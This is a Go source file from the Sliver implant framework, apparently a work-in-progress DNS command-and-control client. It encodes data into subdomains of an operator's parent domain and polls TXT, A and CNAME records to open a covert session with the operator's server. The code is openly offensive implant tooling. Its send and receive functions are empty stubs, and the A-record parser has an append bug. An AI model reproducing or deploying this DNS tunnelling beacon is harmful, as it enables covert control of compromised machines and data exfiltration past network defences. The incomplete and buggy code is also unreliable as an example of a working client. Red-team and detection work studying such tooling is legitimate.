package dnsclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

--------------------------------------------------------------------------

*** BASE32 ***
DNS domains are limited to 254 characters including '.' so that means
Base 32 encoding, so (n*8 + 4) / log2(32) = 63 means we can encode 39 bytes
per subdomain.

Format: (subdata...).<parent domain>
	[63].[63]...[parent].

254 - len(parent) = subdata space, 128 is our worst case where the parent domain is 126 chars,
where [63 NS . 63 TLD], so 128 / 63 = 2 * 39 bytes = 78 bytes, worst case per query

We need to include some metadata in each request:
	Type = 2 bytes max
	ID = 4 bytes max
	Index = 4 bytes max
	Size = 4 bytes max
	Data = 78 - (2+4+4+4) ~= 64 bytes worst case

*** BASE58 ***


*/

// {{if .Config.DNSc2Enabled}}

import (
	"errors"
	"net"
	"strconv"
	"strings"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/protobuf/dnspb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"google.golang.org/protobuf/proto"
)

var (
	errMsgTooLong = errors.New("{{if .Config.Debug}}Too much data to encode{{end}}")
	ErrTimeout    = errors.New("{{if .Config.Debug}}DNS Timeout{{end}}")
)

// DNSStartSession - Attempt to establish a connection to the DNS server of 'parent'
func DNSStartSession(parent string, retry time.Duration, pollTimeout time.Duration) (*SliverDNSClient, error) {
	// {{if .Config.Debug}}
	log.Printf("DNS client connecting to '%s' ...", parent)
	// {{end}}
	client := &SliverDNSClient{
		parent:        "." + strings.TrimPrefix(parent, "."),
		caseSensitive: false,
		forceBase32:   false,
		pollTimeout:   pollTimeout,
		retry:         retry,
		retryCount:    3,
		subdataSpace:  254 - len(parent),

		base32: encoders.Base32{},
		base58: encoders.Base58{},
	}
	err := client.SessionInit()
	if err != nil {
		return nil, err
	}
	return client, nil
}

// SliverDNSClient - The DNS client context
type SliverDNSClient struct {
	parent        string
	retry         time.Duration
	retryCount    int
	pollTimeout   time.Duration
	forceBase32   bool
	caseSensitive bool
	subdataSpace  int

	dnsSessionID uint32

	base32 encoders.Base32
	base58 encoders.Base58
}

// SessionInit - Initialize DNS session
func (s *SliverDNSClient) SessionInit() error {
	otpMsg, err := s.otpMsg()
	if err != nil {
		return err
	}
	otpDomain, err := s.joinSubdata(string(s.base32.Encode(otpMsg)))
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] Fetching dns session id via '%s' ...", otpDomain)
	// {{end}}
	txt, err := s.txt(otpDomain)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] Got response %v ...", txt)
	// {{end}}

	return nil
}

func (s *SliverDNSClient) joinSubdata(subdata string) (string, error) {
	if s.subdataSpace <= len(subdata) {
		return "", errMsgTooLong // For sure won't fit after we add '.'
	}
	subdomains := []string{}
	for index := 0; index < len(subdata); index += 63 {
		stop := index + 63
		if len(subdata) < stop {
			stop = len(subdata)
		}
		subdomains = append(subdomains, subdata[index:stop])
	}
	// s.parent already has a leading '.'
	domain := strings.Join(subdomains, ".") + s.parent
	if 254 < len(domain) {
		return "", errMsgTooLong
	}
	return domain, nil
}

func (s *SliverDNSClient) otpMsg() ([]byte, error) {
	otpCode := cryptography.GetOTPCode()
	otp, err := strconv.Atoi(otpCode)
	if err != nil {
		return nil, err
	}
	otpMsg := &dnspb.DNSMessage{
		Type: dnspb.DNSMessageType_TOTP,
		ID:   uint32(otp), // Take advantage of the variable length encoding
	}
	return proto.Marshal(otpMsg)
}

// WriteEnvelope - Send an envelope to the server
func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
	return nil
}

// ReadEnvelope - Recv an envelope from the server
func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
	return nil, nil
}

// fingerprintResolver - Fingerprints resolve to determine if we can use a case sensitive encoding
func (s *SliverDNSClient) fingerprintResolver() {

}

// Query methods - Currently supports TXT, A, and CNAME
func (s *SliverDNSClient) txt(domain string) (string, error) {
	// {{if .Config.Debug}}
	log.Printf("[dns] txt lookup -> %s", domain)
	// {{end}}

	var txts []string
	var err error
	for retryCount := 0; retryCount < s.retryCount; retryCount++ {
		txts, err = net.LookupTXT(domain)
		if err != nil || len(txts) == 0 {
			// {{if .Config.Debug}}
			log.Printf("[!] dns failure -> %s", domain)
			// {{end}}
		} else {
			break
		}
		// {{if .Config.Debug}}
		log.Printf("[dns] retry sleep: %s", s.retry)
		// {{end}}
		time.Sleep(s.retry)
	}
	if err != nil || len(txts) == 0 {
		return "", err
	} else {
		return strings.Join(txts, ""), nil
	}
}

func (s *SliverDNSClient) a(domain string) ([][]byte, error) {
	// {{if .Config.Debug}}
	log.Printf("[dns] a lookup -> %s", domain)
	// {{end}}

	var ips []net.IP
	var err error
	for retryCount := 0; retryCount < s.retryCount; retryCount++ {
		ips, err = net.LookupIP(domain)
		if err != nil || len(ips) == 0 {
			// {{if .Config.Debug}}
			log.Printf("[!] dns failure -> %s", domain)
			// {{end}}
		} else {
			break
		}
		// {{if .Config.Debug}}
		log.Printf("[dns] retry sleep: %s", s.retry)
		// {{end}}
		time.Sleep(s.retry)
	}
	if err != nil || len(ips) == 0 {
		return nil, err
	} else {
		rawIPs := make([][]byte, len(ips))
		for _, ip := range ips {
			rawIPs = append(rawIPs, ip.To4())
		}
		return rawIPs, nil
	}
}

func (s *SliverDNSClient) cname(domain string) (string, error) {
	// {{if .Config.Debug}}
	log.Printf("[dns] cname lookup -> %s", domain)
	// {{end}}

	var cname string
	var err error
	for retryCount := 0; retryCount < s.retryCount; retryCount++ {
		cname, err = net.LookupCNAME(domain)
		if err != nil || len(cname) == 0 {
			// {{if .Config.Debug}}
			log.Printf("[!] dns failure -> %s", domain)
			// {{end}}
		} else {
			break
		}
		// {{if .Config.Debug}}
		log.Printf("[dns] retry sleep: %s", s.retry)
		// {{end}}
		time.Sleep(s.retry)
	}
	if err != nil || len(cname) == 0 {
		return "", err
	} else {
		return cname, nil
	}
}

// {{end}} -DNSc2Enabled
